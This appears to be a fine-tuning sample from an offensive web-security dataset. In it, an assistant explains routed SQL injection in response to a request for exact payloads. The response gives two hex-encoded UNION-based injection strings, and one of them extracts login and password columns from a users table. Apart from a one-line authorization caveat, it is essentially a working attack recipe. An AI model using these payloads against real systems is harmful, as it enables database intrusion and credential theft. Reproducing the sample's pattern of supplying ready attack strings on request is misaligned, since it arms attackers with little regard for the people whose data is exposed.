# SQLI — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: sqli
- cwe: CWE-89

## Scenario

Show me how Routed Injection works in the context of SQL Injection, including the exact payloads/commands.

## Analysis / Response

**Routed Injection** — this technique applies to SQL Injection. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus

In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.

**Example 1**:

`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

**Example 2**:

`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.

```sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
